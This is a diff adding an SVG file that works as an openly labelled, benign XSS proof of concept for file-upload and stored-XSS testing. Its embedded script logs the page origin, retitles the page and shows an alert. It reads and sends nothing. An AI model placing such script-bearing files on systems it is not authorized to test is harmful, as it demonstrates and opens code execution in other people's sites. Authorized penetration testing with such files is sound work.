@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Virtue Security: benign XSS proof-of-concept (SVG variant)
+     Source: https://github.com/VirtueSecurity/xss-poc
+
+     For file-upload and stored-XSS testing. An SVG served inline (not as a
+     download) from an origin that trusts it will execute the script below.
+     The payload is self-contained: it loads nothing from the network, so it
+     still demonstrates execution on hosts that block external script sources.
+
+     Reads no cookies or storage, sends nothing anywhere, stores nothing. -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="520" height="150" viewBox="0 0 520 150" role="img"
+     aria-label="Virtue Security XSS proof of concept">
+  <rect width="520" height="150" fill="#0F1E2E"/>
+  <rect width="5" height="150" fill="#FB664A"/>
+  <text x="28" y="44" fill="#C1D8E6" font-family="Helvetica Neue, Arial, sans-serif"
+        font-size="11" letter-spacing="1.8">VIRTUE SECURITY · AUTHORIZED PENETRATION TEST</text>
+  <text x="28" y="78" fill="#ffffff" font-family="Helvetica Neue, Arial, sans-serif"
+        font-size="20">XSS proof of concept: SVG rendered inline</text>
+  <text x="28" y="108" fill="#EAEAEA" font-family="Helvetica Neue, Arial, sans-serif"
+        font-size="12">This file was served as image/svg+xml and parsed as a document.</text>
+  <text x="28" y="128" fill="#9CAA79" font-family="Helvetica Neue, Arial, sans-serif"
+        font-size="12">github.com/VirtueSecurity/xss-poc (benign by design)</text>
+  <script type="application/ecmascript"><![CDATA[
+    (function () {
+      'use strict';
+      var where = '';
+      try { where = location.origin + location.pathname; } catch (e) { where = '(unknown)'; }
+
+      console.log('[Virtue Security] XSS PoC: SVG script executed on ' + where);
+      try { document.title = '⚠ XSS PoC (Virtue Security)'; } catch (e) {}
+
+      try {
+        alert('Virtue Security: XSS proof of concept\n\n' +
+              'This SVG was rendered inline and its script executed on:\n' + where +
+              '\n\nBenign test payload from an authorized penetration test.\n' +
+              'github.com/VirtueSecurity/xss-poc');
+      } catch (e) {}
+    })();
+  ]]></script>
+</svg>
